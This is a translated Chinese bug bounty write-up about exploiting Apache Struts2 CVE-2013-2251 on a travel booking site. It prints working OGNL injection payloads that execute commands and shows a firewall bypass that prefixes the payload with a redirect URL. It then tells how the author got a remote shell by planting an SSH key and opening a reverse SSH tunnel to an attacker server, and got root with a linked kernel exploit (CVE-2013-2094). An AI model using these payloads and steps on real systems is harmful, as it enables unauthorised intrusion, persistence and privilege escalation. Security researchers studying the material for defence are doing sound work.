# BugBounty—我如何能够绕过防火墙进行RCE并获取root用户权限！
|
##### 译文声明
本文是翻译文章，文章来源：https://wiki.ioin.in
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
嗨，大家好，  
此篇文章是关于Apache struts2 CVE-2013-2251的病毒式传播并由于其能导致执行远程命令而被高度利用的漏洞。  
简而言之，通过操纵以`"action:"/"redirect:"/"redirectAction:"`为前缀的参数引入的漏洞，可以使用小于`Struts
2.3.15`作为框架，在Java Web应用程序中执行远程命令。  
现在，当这个漏洞发生传播时，主流应用防火墙公司开始更新他们的规则引擎和检测技术，以防止它的进一步感染，这是一个非常明显和负责任的事情。  
但是我不仅能够绕过防火墙并获得远程代码执行，还能够通过利用内核CVE以root用户身份获取服务器的shell
## 完整的攻击流程
这是当我测试旅行预订网站时发现的。  
为了查明应用程序是否正在运行在易受攻击的Apache Struts框架上，您必须简单地检查以下易受攻击的参数 – “action,
redirect,redirectAction”  
我google了一下(并且我受困于一个叫做OGNL的表达式)  
但是这篇文章对我帮助很大：
    http://blog.opensecurityresearch.com/2014/02/attacking-struts-with-cve-2013-2251.html
下面是用于运行命令`ifconfig`的有效payload
    redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}
但正如预期的那样，它被应用程序防火墙阻止，并将我重定向到一个bot机器页面  
当这样的事情发生在我身上时，我总是回到最开始的思考。  
正如前面指出的那样，我知道哪些参数易受攻击，其中之一是我在上述请求中使用的“重定向”。  
“重定向”，是的，只要你觉得它是正确的，就让我们尝试在这里尝试  
我只是把重定向：`http://www.goal.com`  
正如你所看到的，我得到了302重定向并到达了`http://www.goal.com` 🙂  
所以我之前的`ifconfig`有效payload被阻塞了，这个重定向工作，给了我一个绕过防火墙的想法，所以，我将上述有效payload改造成：
    redirect:http://www.goal.com/${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}
并发起请求  
欢呼吧！因为我能够绕过防火墙并获得运行的`ifconfig`命令的输出  
下一个目标是获得服务器的远程shell，我使用反向SSH隧道和公钥认证来尝试它，因为它允许SSH用户在不输入密码的情况下登录。  
为此，我必须将攻击者服务器的ssh公钥放入受害服务器的授权列表`~/.ssh/authorized_keys`中，以证明身份，并且这将成为反向ssh隧道  
因此我必须添加`id_rsa.pub`受害ssh服务器的密钥。  
解释一下上述2个关键词的概念和公钥认证的概念
    id_rsa.pub是您添加到其他主机authorized_keys文件中以允许您以该用户身份登录的公共密钥。
    authorized_keys是允许登录到特定服务器上的特定帐户的公用密钥列表。
第一步 – 使用RCE查找受害服务器的`id_rsa.pub`文件  
第二步 – 将`authorized_keys`从受害者服务器复制到攻击者服务器  
第3步 – 将修改后的`authorized_keys`从攻击者服务器复制回来，通过读取`id_rsa.pub`获得受害者  
现在最后一步 – 在攻击者机器上使用SSH反向隧道，所以我运行了命令行管理程序  
Pheww！能够获取服务器的远程shell:)  
但我没有作为root登录，这意味着我可以只有有限的权利去访问文件。  
现在为了以root用户身份登录，我先去查看当前在受害机器上运行的内核是什么版本  
因此，发现内核版本是2.6.32，我google去查找是否有任何开放CVE和这个相匹配，我的运气不错。发现它很容易受到提权  
漏洞利用：
    github -  https://github.com/realtalk/cve-2013-2094
没有浪费太多时间，我运行了exp。  
最后我能够获得特权升级给root用户！:)  
这就是如何通过利用apache strut2漏洞和内核版本漏洞来获得作为root用户的服务器的远程shell。  
感谢Kunal Aggarwal所有的共同努力！